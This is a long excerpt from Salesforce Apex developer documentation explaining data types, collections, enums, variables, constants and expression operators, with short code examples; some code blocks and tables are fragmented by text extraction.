
# Writing Apex

## Writing Apex

Apex is like Java for Salesforce. It enables you to add and interact with data in the Lightning Platform persistence layer. It uses classes, data types, variables, and if-else statements. You can make it execute based on a condition, or have a block of code execute repeatedly. Data Types and Variables Apex uses data types, variables, and related language constructs such as enums, constants, expressions, operators, and assignment statements. Control Flow Statements Apex provides if-else statements, switch statements, and loops to control the flow of code execution. Statements are generally executed line by line, in the order they appear. With control flow statements, you can make Apex code execute based on a certain condition, or have a block of code execute repeatedly. Working with Data in Apex You can add and interact with data in the Lightning Platform persistence layer. The sObject data type is the main data type that holds data objects. You’ll use Data Manipulation Language (DML) to work with data, and use query languages to retrieve data, such as the (), among other things. Document Your Apex Code ApexDoc is a standardized comment format that makes it easier for humans, documentation generators, and AI agents to understand your codebase. We recommend using ApexDoc comments to facilitate code collaboration and increase long-term code maintainability. Based on the JavaDoc standard, ApexDoc provides specifications, such as specialized tags and guidelines, that are tailored to Apex and the Salesforce ecosystem.

## Data Types and Variables

Apex uses data types, variables, and related language constructs such as enums, constants, expressions, operators, and assignment statements. 1. Data Types In Apex, all variables and expressions have a data type, such as sObject, primitive, or enum. 2. Primitive Data Types Apex uses the same primitive data types as SOAP API, except for higher-precision Decimal type in certain cases. 3. Collections Collections in Apex can be lists, sets, or maps. 4. Enums An enum is an abstract data type with values that each take on exactly one of a finite set of identifiers that you specify. Enums are typically used to define a set of possible values that don’t otherwise have a numerical order. Typical examples include the suit of a card, or a particular season of the year. 5. Variables Local variables are declared with Java-style syntax. 6. Constants Apex constants are variables whose values don’t change after being initialized once. Constants can be defined using the `final` keyword. 7. Expressions and Operators An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value. 8. Assignment Statements An assignment statement is any statement that places a value into a variable. 9. Rules of Conversion In general, Apex requires you to explicitly convert one data type to another. For example, a variable of the Integer data type cannot be implicitly converted to a String. You must use the `string.format` method. However, a few data types can be implicitly converted, without using a method.

### Data Types

In Apex, all variables and expressions have a data type, such as sObject, primitive, or enum. A primitive, such as an Integer, Double, Long, Date, Datetime, String, ID, or Boolean (see Primitive Data Types on page 24) An sObject, either as a generic sObject or as a specific sObject, such as an Account, Contact, or MyCustomObject__c (see Working with sObjects on page 132 in Chapter 4.) A collection, including: A list (or array) of primitives, sObjects, user defined objects, objects created from Apex classes, or collections (see Lists on page 29) A set of primitives (see Sets on page 31) A map from a primitive to a primitive, sObject, or collection (see Maps on page 32) A typed list of values, also known as an enum (see Enums on page 34) Objects created from user-defined Apex classes (see Classes, Objects, and Interfaces on page 61) Objects created from system supplied Apex classes Null (for the `null` constant, which can be assigned to any variable) Methods can return values of any of the listed types, or return no value and be of type Void. Type checking is strictly enforced at compile time. For example, the parser generates an error if an object field of type Integer is assigned a value of type String. However, all compile-time exceptions are returned as specific fault codes, with the line number and column of the error. For more information, see Debugging Apex on page 677.

### Primitive Data Types

Apex uses the same primitive data types as SOAP API, except for higher-precision Decimal type in certain cases. All Apex variables, whether they’re class member variables or method variables, are initialized to `null` . Make sure that you initialize your variables to appropriate values before using them. For example, initialize a Boolean variable to `false` . Apex primitive data types include: A collection of binary data stored as a single object. You can convert this data type to String or from String using the `toString` and `valueOf` methods, respectively. Blobs can be accepted as Web Blob service arguments, stored in a document (the body of a document is a Blob), or sent as attachments. For more information, see Crypto Class . Salesforce supports Blob manipulation only with Apex class methods that are supplied by Salesforce. A value that can only be assigned `true` , `false` , or `null` . For example:

```apex
Boolean isWinner = true;
```

Boolean A value that indicates a particular day. Unlike Datetime values, Date values contain no information about time. Always create date values with a system static method. You can add or subtract an Integer value from a Date value, returning a Date value. Addition and subtraction of Integer values are the only arithmetic functions that work with Date values. You can’t perform arithmetic functions that include two or more Date values. Instead, use the Date methods . Date Use the `String.valueOf()` method to obtain the date without an appended timestamp. Using an implicit string conversion with a Date value results in the date with the timestamp appended. A value that indicates a particular day and time, such as a timestamp. Always create datetime values with a system static method. You can add or subtract an Integer or Double value from a Datetime value, returning a Date value. Addition and subtraction of Integer and Double values are the only arithmetic functions that work Datetime with Datetime values. You can’t perform arithmetic functions that include two or more Datetime values. Instead, use the Datetime methods . A number that includes a decimal point. Decimal is an arbitrary precision number. Currency fields are automatically assigned the type Decimal. If you don’t explicitly set the number of decimal places for a Decimal, the item from which the Decimal is created determines the Decimal’s scale. Scale is a count of decimal places. Use the `setScale` method to set a Decimal’s scale. Decimal If the Decimal is created as part of a query, the scale is based on the scale of the field returned from the query. If the Decimal is created from a String, the scale is the number of characters after the decimal point of the String. If the Decimal is created from a non-decimal number, the number is first converted to a String. The scale is then set using the number of characters after the decimal point. Two Decimal objects that are numerically equivalent but differ in scale (such as 1.1 and 1.10) generally don’t have the same hashcode. Use caution when such Decimal objects are used in Sets or as Map keys. A 64-bit number that includes a decimal point. Doubles have a minimum value of -2 63 and a maximum value of 2 63 -1. For example:

```apex
Double pi = 3.14159;
Double e = 2.7182818284D;
```

Double Scientific notation (e) for Doubles isn’t supported. Any valid 18-character Lightning Platform record identifier. For example:

```apex
ID id='00300000003T2PGAA0';
```

ID If you set `ID` to a 15-character value, Apex converts the value to its 18-character representation. All invalid `ID` values are rejected with a runtime exception. A 32-bit number that doesn’t include a decimal point. Integers have a minimum value of -2,147,483,648 and a maximum value of 2,147,483,647. For example:

```apex
Integer i = 1;
```

Integer A 64-bit number that doesn’t include a decimal point. Longs have a minimum value of -2 63 and a maximum value of 2 63 -1. Use this data type when you need a range of values wider than the range provided by Integer. For example:

```apex
Long l = 2147483648L;
```

Long Any data type that is supported in Apex. Apex supports primitive data types (such as Integer), user-defined custom classes, the sObject generic type, or an sObject specific type (such as Account). All Apex data types inherit from Object. Object You can cast an object that represents a more specific data type to its underlying data type. For example:

```apex
Object obj = 10;
// Cast the object to an integer.
Integer i = (Integer)obj;
System.assertEquals(10, i);
```

The next example shows how to cast an object to a user-defined type—a custom Apex class named `MyApexClass` that is predefined in your organization.

```apex
Object obj = new MyApexClass();
// Cast the object to the MyApexClass custom type.
MyApexClass mc = (MyApexClass)obj;
// Access a method on the user-defined class.
mc.someClassMethod();
```

Any set of characters surrounded by single quotes. For example,

```apex
String s = 'The quick brown fox jumped over the lazy dog.';
```

String **String size** : The limit on the number of characters is governed by the heap size limit . **Empty Strings and Trailing Whitespace** : sObject String field values follow the same rules as in SOAP API: they can never be empty (only `null` ), and they can never include leading and trailing whitespace. These conventions are necessary for database storage. Conversely, Strings in Apex can be `null` or empty and can include leading and trailing whitespace, which can be used to construct a message. **EscapeSequences** : All Strings in Apex use the same escape sequences as SOQL strings: `\b` (backspace), `\t` (tab), `\n` (line feed), `\f` (form feed), `\r` (carriage return), `\s` (space), `\` `"` (double quote), `\` `'` (single quote), and `\\` (backslash). **Comparison Operators** : Unlike Java, Apex Strings support using the comparison operators `==` , `!=` , `<` , `<=` , `>` , and `>=` . Because Apex uses SOQL comparison semantics, results for Strings are collated according to the context user’s locale and aren’t case-sensitive. For more information, see Expression Operators . **String Methods** : As in Java, Strings can be manipulated with several standard methods. For more information, see String Class . **Multiline Strings** : To represent a block of text that spans multiple lines, use a multiline string. A multiline string starts with three single quotes ( `'''` ) immediately followed by a new line. To terminate a multiline string, use three single quotes ( `'''` ). For example:

```apex
String multilineStr = '''
{
```

```apex
"Name" : "John Doe",
"Type" : "New Customer"
}''';
```

For more information, see the Multiline String Usage section. A value that indicates a particular time. Always create time values with a system static method. See Time Class . Time In addition, two non-standard primitive data types can’t be used as variable or method types, but do appear in system static methods: AnyType. The `valueOf` static method converts an sObject field of type AnyType to a standard primitive. AnyType is used within the Lightning Platform database exclusively for sObject fields in field history tracking tables. Currency. The `Currency.newInstance` static method creates a literal of type Currency. This method is for use solely within SOQL and SOSL `WHERE` clauses to filter against sObject currency fields. You can’t instantiate Currency in any other type of Apex. For more information on the AnyType data type, see Field Types in the Object Reference for Salesforce .

#### Multiline String Usage

**Line Breaks** : Line breaks are automatically translated into newline sequences in the resulting string. **Whitespace** : Any whitespace before the leftmost non-whitespace character of the string is stripped. Trailing whitespace on each line is also stripped. During compilation, whitespace stripping occurs before escape sequences are processed. In this example, the initial eight whitespace characters, represented as periods, on each line are stripped. This removal occurs because the `<` character is the leftmost non-whitespace character in the string. The trailing whitespace characters found on the first, third, and fifth lines of the string are also stripped.

```apex
String str = '''
. . . . . . . . <html> . . .
. . . . . . . . . . . . <body>
. . . . . . . . . . . . . . . . <p>Hello, world</p> . . .
. . . . . . . . . . . . </body>
. . . . . . . . </html> . . .
. . . . . . . .''';
```

**Escape Sequences** : Multiline strings support the same escape sequences as regular Apex strings. Use the `\s` escape sequence at the end of a line to create intentional trailing whitespace. In this example, three trailing whitespace characters are preserved on the first and fifth lines of the string. The trailing whitespace on the third line of the string is stripped.

```apex
String str = '''
. . . . . . . . <html> . . . . \s
. . . . . . . . . . . . <body>
. . . . . . . . . . . . . . . . <p>Hello, world</p> . . . .
. . . . . . . . . . . . </body>
. . . . . . . . </html> . . . . \s
. . . . . . . .''';
```

Multiline strings additionally support the `\` (concatenate) sequence at the end of lines. The `\` escape sequence concatenates multiple lines and prevents the insertion of a newline sequence between them. For example, this multiline string compiles as one line.

```apex
String str = '''
```

```apex
This is a string that doesn't fit on one line \
but I don't want it to contain newlines \
....so I am using this escape sequence to \
....prevent them from being inserted''';
```

Unlike regular Apex strings, multiline strings also support unescaped single quotes ( `'` ). However, to use a single quote directly before the closing single quotes ( `'''` ), first escape the single quote. ( `\` `''''` ). For example, the second single quote in this multiline string requires an escape character, whereas the first one doesn’t.

```apex
String str = '''
```

```apex
I want a single quote here '
And also right before the string ends\'''';
```

**SOQL Queries** : In SOQL and SOSL queries, you can use multiline strings stored in variables. However, unlike regular string literals, you can’t use multiline literals in SOQL or SOSL queries, except in bind expressions. For example, this pattern is unsupported.

```apex
// Unsupported
List<Account> accs = [SELECT Id FROM Account
WHERE Name = '''
```

```apex
ExampleOne
'''
WITH USER_MODE
];
```

Otherwise, you can use multiline literals anywhere you can use regular string literals, such as annotation parameters, variable assignments, and method argument values.

#### Versioned Behavior Changes

In API version 16.0 and later, Apex uses the higher-precision Decimal data type in certain types such as currency. In API version 15.0 and later, Apex classes and triggers produce a runtime error if you assign a String value that is too long for the field. Expression Operators Class Methods Object Reference for the Salesforce Platform : Primitive Data Types

### Collections

Collections in Apex can be lists, sets, or maps. There is no limit on the number of items a collection can hold. However, there is a general limit on heap size. Lists A list is an ordered collection of elements that are distinguished by their indices. List elements can be of any data type—primitive types, collections, sObjects, user-defined types, and built-in Apex types. Sets A set is an unordered collection of elements that do not contain any duplicates. Set elements can be of any data type—primitive types, collections, sObjects, user-defined types, and built-in Apex types. Maps A map is a collection of key-value pairs where each unique key maps to a single value. Keys and values can be any data type—primitive types, collections, sObjects, user-defined types, and built-in Apex types. Parameterized Typing Apex, in general, is a statically-typed programming language, which means users must specify the data type for a variable before that variable can be used. Execution Governors and Limits

#### Lists

A list is an ordered collection of elements that are distinguished by their indices. List elements can be of any data type—primitive types, collections, sObjects, user-defined types, and built-in Apex types. This table is a visual representation of a list of Strings: 'Purple' 'Blue' 'Green' 'Yellow' 'Orange' 'Red' The index position of the first element in a list is always 0. Lists can contain any collection and can be nested within one another and become multidimensional. For example, you can have a list of lists of sets of Integers. A list can contain up to seven levels of nested collections inside it, that is, up to eight levels overall. To declare a list, use the `List` keyword followed by the primitive data, sObject, nested list, map, or set type within <> characters. For example:

```apex
// Create an empty list of String
List<String> my_list = new List<String>();
// Create a nested list
List<List<Set<Integer>>> my_list_2 = new List<List<Set<Integer>>>();
```

To access elements in a list, use the `List` methods provided by Apex. For example:

```apex
List<Integer> myList = new List<Integer>(); // Define a new list
myList.add(47);
// Adds a second element of value 47 to the end
```

```apex
// of the list
Integer i = myList.get(0);
// Retrieves the element at index 0
myList.set(0, 1);
// Adds the integer 1 to the list at index 0
myList.clear();
// Removes all elements from the list
```

For more information, including a complete list of all supported methods, see List Class . When using one-dimensional lists of primitives or objects, you can also use more traditional array notation to declare and reference list elements. For example, you can declare a one-dimensional list of primitives or objects by following the data type name with the [] characters:

```apex
String[] colors = new List<String>();
```

These two statements are equivalent to the previous:

```apex
List<String> colors = new String[1];
```

```apex
String[] colors = new String[1];
```

To reference an element of a one-dimensional list, you can also follow the name of the list with the element's index position in square brackets. For example:

```apex
colors[0] = 'Green';
```

Even though the size of the previous `String` array is defined as one element (the number between the brackets in `new` `String` `[1]` ), lists are elastic and can grow as needed provided that you use the `List` `add` method to add new elements. For example, you can add two or more elements to the `colors` list. But if you’re using square brackets to add an element to a list, the list behaves like an array and isn’t elastic, that is, you won’t be allowed to add more elements than the declared array size. All lists are initialized to `null` . Lists can be assigned values and allocated memory using literal notation. For example: Defines an Integer list of size zero with no elements `List<` `Integer` `>` `ints` `=` `new` `Integer` `[0];` Defines an Integer list with memory allocated for six Integers `List<` `Integer` `>` `ints` `=` `new` `Integer` `[6];` List Sorting You can sort list elements and the sort order depends on the data type of the elements. You can sort list elements and the sort order depends on the data type of the elements. Using the `List.sort` method, you can sort elements in a list. Sorting is in ascending order for elements of primitive data types, such as strings. The sort order of other more complex data types is described in the chapters covering those data types. You can sort custom types (your Apex classes) if they implement the `Comparable` interface. Alternatively, a class implementing the `Comparator` interface can be passed as a parameter to the `List.sort` method. For more information on the sort order used for sObjects, see Sorting Lists of sObjects . This example shows how to sort a list of strings and verifies that the colors are in ascending order in the list.

```apex
List<String> colors = new List<String>{
```

```apex
'Yellow',
'Red',
'Green'};
colors.sort();
System.assertEquals('Green', colors.get(0));
System.assertEquals('Red', colors.get(1));
System.assertEquals('Yellow', colors.get(2));
```

For the Visualforce SelectOption control, sorting is in ascending order based on the value and label fields. See this next section for the sequence of comparison steps used for SelectOption. Default Sort Order for SelectOption The `List.sort` method sorts SelectOption elements in ascending order using the value and label fields, and is based on this comparison sequence. **1.** The value field is used for sorting first. **2.** If two value fields have the same value or are both empty, the label field is used. The disabled field isn’t used for sorting. For text fields, the sort algorithm uses the Unicode sort order. Also, empty fields precede non-empty fields in the sort order. In this example, a list contains three SelectOption elements. Two elements, United States and Mexico, have the same value field (‘A’). The `List.sort` method sorts these two elements based on the label field, and places Mexico before United States, as shown in the output. The last element in the sorted list is Canada and is sorted on its value field ‘C’, which comes after ‘A’.

```apex
List<SelectOption> options = new List<SelectOption>();
options.add(new SelectOption('A','United States'));
options.add(new SelectOption('C','Canada'));
options.add(new SelectOption('A','Mexico'));
System.debug('Before sorting: ' + options);
options.sort();
System.debug('After sorting: ' + options);
```

The output of the debug statements shows the contents of the list, both before and after the sort.

```apex
DEBUG|Before sorting: (System.SelectOption[value="A", label="United States",
disabled="false"],
System.SelectOption[value="C", label="Canada", disabled="false"],
System.SelectOption[value="A", label="Mexico", disabled="false"])
DEBUG|After sorting: (System.SelectOption[value="A", label="Mexico", disabled="false"],
System.SelectOption[value="A", label="United States", disabled="false"],
System.SelectOption[value="C", label="Canada", disabled="false"])
```

#### Sets

A set is an unordered collection of elements that do not contain any duplicates. Set elements can be of any data type—primitive types, collections, sObjects, user-defined types, and built-in Apex types. This table represents a set of strings that uses city names: 'Tokyo' 'Paris' 'New York' 'San Francisco' Sets can contain collections that can be nested within one another. For example, you can have a set of lists of sets of Integers. A set can contain up to seven levels of nested collections inside it, that is, up to eight levels overall. To declare a set, use the `Set` keyword followed by the primitive data type name within <> characters. For example:

```apex
Set<String> myStringSet = new Set<String>();
```

The following example shows how to create a set with two hardcoded string values.

```apex
// Defines a new set with two elements
Set<String> set1 = new Set<String>{'New York', 'Paris'};
```

To access elements in a set, use the system methods provided by Apex. For example:

```apex
// Define a new set
Set<Integer> mySet = new Set<Integer>();
// Add two elements to the set
mySet.add(1);
mySet.add(3);
// Assert that the set contains the integer value we added
System.assert(mySet.contains(1));
// Remove the integer value from the set
mySet.remove(1);
```

The following example shows how to create a set from elements of another set.

```apex
// Define a new set that contains the
// elements of the set created in the previous example
Set<Integer> mySet2 = new Set<Integer>(mySet);
// Assert that the set size equals 1
// Note: The set from the previous example contains only one value
System.assert(mySet2.size() == 1);
```

For more information, including a complete list of all supported set system methods, see Set Class . Note the following limitations on sets: Unlike Java, Apex developers do not need to reference the algorithm that is used to implement a set in their declarations (for example, `HashSet` or `TreeSet` ). Apex uses a hash structure for all sets. A set is an unordered collection—you can’t access a set element at a specific index. You can only iterate over set elements. The iteration order of set elements is deterministic, so you can rely on the order being the same in each subsequent execution of the same code.

#### Maps

A map is a collection of key-value pairs where each unique key maps to a single value. Keys and values can be any data type—primitive types, collections, sObjects, user-defined types, and built-in Apex types. This table represents a map of countries and currencies: 'India' 'England' 'France' 'Japan' 'United States' **Country (Key)** 'Rupee' 'Pound' 'Euro' 'Yen' 'Dollar' **Currency (Value)** Map keys and values can contain any collection, and can contain nested collections. For example, you can have a map of Integers to maps, which, in turn, map Strings to lists. Map keys can contain up to seven levels of nested collections, that is, up to eight levels overall. To declare a map, use the `Map` keyword followed by the data types of the key and the value within `<>` characters. For example:

```apex
Map<String, String> country_currencies = new Map<String, String>();
Map<ID, Set<String>> m = new Map<ID, Set<String>>();
```

You can use the generic or specific sObject data types with maps. You can also create a generic instance of a map. As with lists, you can populate map key-value pairs when the map is declared by using curly brace ( `{}` ) syntax. Within the curly braces, specify the key first, then specify the value for that key using `=>` . For example:

```apex
Map<String, String> MyStrings = new Map<String, String>{'a' => 'b', 'c' =>
'd'.toUpperCase()};
```

In the first example, the value for the key `a` is `b` , and the value for the key `c` is `D` . To access elements in a map, use the Map methods provided by Apex. This example creates a map of integer keys and string values. It adds two entries, checks for the existence of the first key, retrieves the value for the second entry, and finally gets the set of all keys.

```apex
Map<Integer, String> m = new Map<Integer, String>(); // Define a new map
m.put(1, 'First entry');
// Insert a new key-value pair in the map
m.put(2, 'Second entry');
// Insert a new key-value pair in the map
System.assert(m.containsKey(1));
// Assert that the map contains a key
String value = m.get(2);
// Retrieve a value, given a particular key
System.assertEquals('Second entry', value);
Set<Integer> s = m.keySet();
// Return a set that contains all of the keys in the
map
```

For more information, including a complete list of all supported Map methods, see Map Class . Unlike Java, Apex developers don’t need to reference the algorithm that is used to implement a map in their declarations (for example, `HashMap` or `TreeMap` ). Apex uses a hash structure for all maps. The iteration order of map elements is deterministic. You can rely on the order being the same in each subsequent execution of the same code. However, we recommend to always access map elements by key. A map key can hold the `null` value. Adding a map entry with a key that matches an existing key in the map overwrites the existing entry with that key with the new entry. Map keys of type String are case-sensitive. Two keys that differ only by the case are considered unique and have corresponding distinct Map entries. Subsequently, the Map methods, including `put` , `get` , `containsKey` , and `remove` treat these keys as distinct. Uniqueness of map keys of user-defined types is determined by the `equals` and `hashCode` methods , which you provide in your classes. Uniqueness of keys of all other non-primitive types, such as sObject keys, is determined by comparing the objects’ field values. Use caution when you use an sObject as a map key because when the sObject is changed, it no longer maps to the same value. For information and examples, see https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_map_sobject_considerations.htm A Map object is serializable into JSON only if it uses one of the following data types as a key. Boolean Date DateTime Decimal Double Enum Id Integer Long String Time

#### Parameterized Typing

Apex, in general, is a statically-typed programming language, which means users must specify the data type for a variable before that variable can be used. This is legal in Apex:

```apex
Integer x = 1;
```

This is not legal, if `x` has not been defined earlier:

```apex
x = 1;
```

Lists, maps and sets are parameterized in Apex: they take any data type Apex supports for them as an argument. That data type must be replaced with an actual data type upon construction of the list, map or set. For example:

```apex
List<String> myList = new List<String>();
```

In Apex, if type `T` is a subtype of `U` , then `List<T>` would be a subtype of `List<U>` . For example, the following is legal:

```apex
List<String> slst = new List<String> {'alpha', 'beta'};
List<Object> olst = slst;
```

### Enums

An enum is an abstract data type with values that each take on exactly one of a finite set of identifiers that you specify. Enums are typically used to define a set of possible values that don’t otherwise have a numerical order. Typical examples include the suit of a card, or a particular season of the year. Although each value corresponds to a distinct integer value, the enum hides this implementation. Hiding the implementation prevents any possible misuse of the values to perform arithmetic and so on. After you create an enum, variables, method arguments, and return types can be declared of that type. Unlike Java, the enum type itself has no constructor syntax. To define an enum, use the `enum` keyword in your declaration and use curly braces to demarcate the list of possible values. For example, the following code creates an enum called `Season` :

```apex
public enum Season {WINTER, SPRING, SUMMER, FALL}
```

By creating the enum `Season` , you have also created a new data type called `Season` . You can use this new data type as you would any other data type. For example:

```apex
Season southernHemisphereSeason = Season.WINTER;
```

```apex
public Season getSouthernHemisphereSeason(Season northernHemisphereSeason) {
```

```apex
if (northernHemisphereSeason == Season.SUMMER) return southernHemisphereSeason;
```

```apex
//...
}
```

You can also define a class as an enum. When you create an enum class, do not use the `class` keyword in the definition.

```apex
public enum MyEnumClass { X, Y }
```

You can use an enum in any place you can use another data type name. If you define a variable whose type is an enum, any object you assign to it must be an instance of that enum class. Any `webservice` method can use enum types as part of their signature. In this case, the associated WSDL file includes definitions for the enum and its values, which the API client can use. Apex provides the following system-defined enums:

```apex
•
System.StatusCode
```

This enum corresponds to the API error code that is exposed in the WSDL document for all API operations. For example:

```apex
StatusCode.CANNOT_INSERT_UPDATE_ACTIVATE_ENTITY
StatusCode.INSUFFICIENT_ACCESS_ON_CROSS_REFERENCE_ENTITY
```

The full list of status codes is available in the WSDL file for your organization. For more information about accessing the WSDL file for your organization, see Downloading Salesforce WSDLs and Client Authentication Certificates in Salesforce Help. `System.XmlTag` : This enum returns a list of XML tags used for parsing the result XML from a `webservice` method. For more information, see XmlStreamReader Class . `System.ApplicationReadWriteMode` : This enum indicates if an organization is in 5 Minute Upgrade read-only mode during Salesforce upgrades and downtimes. For more information, see System.getApplicationReadWriteMode() .

```apex
•
System.LoggingLevel:
```

This enum is used with the `system.debug` method, to specify the log level for all `debug` calls. For more information, see System Class .

```apex
•
System.RoundingMode:
```

This enum is used by methods that perform mathematical operations to specify the rounding behavior for the operation. Typical examples are the Decimal `divide` method and the Double `round` method. For more information, see Rounding Mode . `System.SoapType` : This enum is returned by the field describe result `getSoapType` method. For more information, see SOAPType Enum .

```apex
•
System.DisplayType:
```

This enum is returned by the field describe result `getType` method. For more information, see DisplayType Enum . `System.JSONToken` : This enum is used for parsing JSON content. For more information, see JsonToken Enum .

```apex
•
ApexPages.Severity:
```

This enum specifies the severity of a Visualforce message. For more information, see ApexPages.Severity Enum . `Dom.XmlNodeType` : This enum specifies the node type in a DOM document. System-defined enums cannot be used in Web service methods. All enum values, including system enums, have common methods associated with them. For more information, see Enum Methods . You cannot add user-defined methods to enum values.

### Variables

Local variables are declared with Java-style syntax. For example:

```apex
Integer i = 0;
String str;
List<String> strList;
Set<String> s;
Map<ID, String> m;
```

As with Java, multiple variables can be declared and initialized in a single statement, using comma separation. For example:

```apex
Integer i, j, k;
```

#### Variable Naming Rules

When naming variables, follow these rules. Variable names are case-insensitive. Variable names can contain only letters (A-Z or a-z), numbers (0-9), and underscores (_). Spaces and other special characters, including dollar signs ($) and hyphens (-), aren’t allowed. Variable names must begin with a letter (A-Z or a-z). Names can’t begin with a number (0-9) or an underscore (_). Variable names can’t end with an underscore (_). Varable names can’t contain consecutive underscores (_ _). Reserved keywords can’t be used as variable names. Variable names can have a maximum length of 255 characters. Salesforce doesn't recommend sharing the same name between a variable and either its class or a method in its class, although it is permitted to do so.

#### Null Variables and Initial Values

If you declare a variable and don't initialize it with a value, it will be `null` . In essence, `null` means the absence of a value. You can also assign `null` to any variable declared with a primitive type. For example, both of these statements result in a variable set to `null` :

```apex
Boolean x = null;
Decimal d;
```

Many instance methods on the data type will fail if the variable is `null` . In this example, the second statement generates an exception ( `NullPointerException` )

```apex
Date d;
d.addDays(2);
```

All variables are initialized to `null` if they aren’t assigned a value. For instance, in the following example, `i` , and `k` are assigned values, while the integer variable `j` and the boolean variable `b` are set to `null` because they aren’t explicitly initialized.

```apex
Integer i = 0, j, k = 1;
Boolean b;
```

A common pitfall is to assume that an uninitialized boolean variable is initialized to `false` by the system. This isn’t the case. Like all other variables, boolean variables are null if not assigned a value explicitly.

#### Variable Scope

Variables can be defined at any point in a block, and take on scope from that point forward. Sub-blocks can’t redefine a variable name that has already been used in a parent block, but parallel blocks can reuse a variable name. For example:

```apex
Integer i;
{
```

```apex
// Integer i;
This declaration is not allowed
}
```

```apex
for (Integer j = 0; j < 10; j++);
for (Integer j = 0; j < 10; j++);
```

#### Case Sensitivity

To avoid confusion with case-insensitive SOQL and SOSL queries, Apex is also case-insensitive. This means: Variable and method names are case-insensitive. For example:

```apex
Integer I;
//Integer i;
```

References to object and field names are case-insensitive. For example:

```apex
Account a1;
ACCOUNT a2;
```

SOQL and SOSL statements are case- insensitive. For example:

```apex
Account[] accts = [sELect ID From ACCouNT where nAme = 'fred'];
```

You’ll learn more about sObjects, SOQL, and SOSL later in this guide. Also note that Apex uses the same filtering semantics as SOQL, which is the basis for comparisons in the SOAP API and the Salesforce user interface. The use of these semantics can lead to some interesting behavior. For example, if an end-user generates a report based on a filter for values that come before 'm' in the alphabet (that is, values < 'm'), null fields are returned in the result. The rationale for this behavior is that users typically think of a field without a value as just a space character, rather than its actual `null` value. Consequently, in Apex, the following expressions all evaluate to `true` :

```apex
String s;
System.assert('a' == 'A');
System.assert(s < 'b');
System.assert(!(s > 'b'));
```

Although `s` `<` `'b'` evaluates to `true` in the example above, `'b.'` `compareTo(s)` generates an error because you’re trying to compare a letter to a `null` value. Naming Conventions

### Constants

Apex constants are variables whose values don’t change after being initialized once. Constants can be defined using the `final` keyword. The `final` keyword means that the variable can be assigned at most once, either in the declaration itself, or with a static initializer method if the constant is defined in a class. This example declares two constants. The first is initialized in the declaration statement. The second is assigned a value in a static block by calling a static method.

```apex
public class myCls {
```

```apex
static final Integer PRIVATE_INT_CONST = 200;
static final Integer PRIVATE_INT_CONST2;
```

```apex
public static Integer calculate() {
```

```apex
return 2 + 7;
}
```

```apex
static {
PRIVATE_INT_CONST2 = calculate();
}
}
```

For more information, see Using the `final` Keyword on page 86.

### Expressions and Operators

An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value. Expressions An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value. Expression Operators Expressions can be joined to one another with operators to create compound expressions. Safe Navigation Operator Use the safe navigation operator ( `?.` ) to replace explicit, sequential checks for null references. This operator short-circuits expressions that attempt to operate on a null value and returns null instead of throwing a NullPointerException. Null Coalescing Operator The `??` operator returns its right-hand side operand when its left-hand side operand is null. Similar to the safe navigation operator ( `?.` ), the null coalescing operator ( `??` ) replaces verbose and explicit checks for null references in code. Operator Precedence Operators are interpreted in order, according to rules. Comments Both single and multiline comments are supported in Apex code. Expanding sObject and List Expressions

#### Expressions

An expression is a construct made up of variables, operators, and method invocations that evaluates to a single value. In Apex, an expression is always one of the following types: A literal expression. For example:

```apex
1 + 1
```

A new sObject, Apex object, list, set, or map. For example:

```apex
new Account(<field_initializers>)
new Integer[<n>]
new Account[]{<elements>}
new List<Account>()
new Set<String>{}
new Map<String, Integer>()
new myRenamingClass(string oldName, string newName)
```

Any value that can act as the left-hand of an assignment operator (L-values), including variables, one-dimensional list positions, and most sObject or Apex object field references. For example:

```apex
Integer i
myList[3]
myContact.name
myRenamingClass.oldName
```

Any sObject field reference that is not an L-value, including: The ID of an sObject in a list (see Lists ) A set of child records associated with an sObject (for example, the set of contacts associated with a particular account). This type of expression yields a query result, much like SOQL and SOSL queries. A SOQL or SOSL query surrounded by square brackets, allowing for on-the-fly evaluation in Apex. For example:

```apex
Account[] aa = [SELECT Id, Name FROM Account WHERE Name ='Acme'];
Integer i = [SELECT COUNT() FROM Contact WHERE LastName ='Weissman'];
List<List<SObject>> searchList = [FIND 'map*' IN ALL FIELDS RETURNING Account (Id, Name),
Contact, Opportunity, Lead];
```

For information, see SOQL and SOSL Queries on page 169. A static or instance method invocation. For example:

```apex
System.assert(true)
myRenamingClass.replaceNames()
changePoint(new Point(x, y));
```

#### Expression Operators

Expressions can be joined to one another with operators to create compound expressions. Apex supports the following operators: **Assignment operator** (Right associative). Assigns the value of `y` to the L-value `x` . The data type of `x` must match the data type of `y` and can’t be `null` . `x` `=` `y` `=` **Addition assignment operator** (Right associative). Adds the value of `y` to the original value of `x` and then reassigns the new value to `x` . See `+` for additional information. `x` and `y` can’t be `null` .

```apex
x += y
+=
```

**Multiplication assignment operator** (Right associative). Multiplies the value of `y` with the original value of `x` and then reassigns the new value to `x` . `x` `*=` `y` `*=` `x` and `y` must be Integers or Doubles or a combination. `x` and `y` can’t be `null` . **Subtraction assignment operator** (Right associative). Subtracts the value of `y` from the original value of `x` and then reassigns the new value to `x` . `x` `-=` `y` `-=` `x` and `y` must be Integers or Doubles or a combination. `x` and `y` can’t be `null` . **Division assignment operator** (Right associative). Divides the original value of `x` with the value of `y` and then reassigns the new value to `x` . `x` `/=` `y` `/=` `x` and `y` must be Integers or Doubles or a combination. `x` and `y` can’t be `null` . **OR assignment operator** (Right associative). If `x` , a Boolean, and `y` , a Boolean, are both false, then `x` remains false. Otherwise `x` is assigned the value of true. `x` and `y` can’t be `null` .

```apex
x |= y
|=
```

**AND assignment operator** (Right associative). If `x` , a Boolean, and `y` , a Boolean, are both true, then `x` remains true. Otherwise `x` is assigned the value of false. `x` and `y` can’t be `null` .

```apex
x &= y
&=
```

**Bitwise shift left assignment operator** . Shifts each bit in `x` to the left by `y` bits so that the high-order bits are lost and the new right bits are set to 0. This value is then reassigned to `x` .

```apex
x <<= y
<<=
```

**Bitwise shift right signed assignment operator** . Shifts each bit in `x` to the right by `y` bits so that the low-order bits are lost and the new left bits are set to 0 for `x` `>>=` `y` `>>=` positive values of `y` and 1 for negative values of `y` . This value is then reassigned to `x` . **Bitwise shift right unsigned assignment operator** . Shifts each bit in `x` to the right by `y` bits so that the low-order bits are lost and the new left bits are set to 0 for all values of `y` . This value is then reassigned to `x` .

```apex
x >>>= y
>>>=
```

